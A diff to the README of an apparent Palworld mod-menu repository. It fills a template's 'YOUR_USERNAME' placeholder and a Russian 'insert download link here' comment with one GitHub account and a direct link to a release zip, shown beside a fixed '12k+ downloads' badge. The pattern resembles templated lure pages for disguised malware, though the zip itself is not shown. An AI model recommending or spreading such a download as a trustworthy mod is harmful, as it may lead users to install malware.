@@ -10,7 +10,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Palworld-Ultimate-Mod"><img src="https://img.shields.io/badge/version-2.0.0-brightgreen?style=flat-square" alt="Version"></a>
+  <a href="https://github.com/hectootokagejoist/Palworld-Ultimate-Mod"><img src="https://img.shields.io/badge/version-2.0.0-brightgreen?style=flat-square" alt="Version"></a>
   <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
   <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
   <a href="#"><img src="https://img.shields.io/badge/downloads-12k%2B-brightgreen?style=flat-square" alt="Downloads"></a>
@@ -31,8 +31,7 @@ The Palworld Mod Menu is a fully interactive UI that appears in-game, giving you
 ## 📥 Download
 
 <p align="center">
-  <!-- СЮДА ВСТАВИТЬ ССЫЛКУ НА СКАЧИВАНИЕ -->
-  <a href="ССЫЛКА_НА_СКАЧИВАНИЕ">
+  <a href="https://github.com/hectootokagejoist/Palworld-Ultimate-Mod/releases/download/24/PalworldUltimateMOD.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
@@ -179,7 +178,7 @@ The Palworld Mod Menu is a fully interactive UI that appears in-game, giving you
 ---
 
 <p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Palworld-Ultimate-Mod">
+  <a href="https://github.com/hectootokagejoist/Palworld-Ultimate-Mod">
     <img src="https://img.shields.io/badge/Made%20with%20❤️%20for%20the%20Palworld%20community-ff69b4?style=for-the-badge" alt="Made with love">
   </a>
 </p>
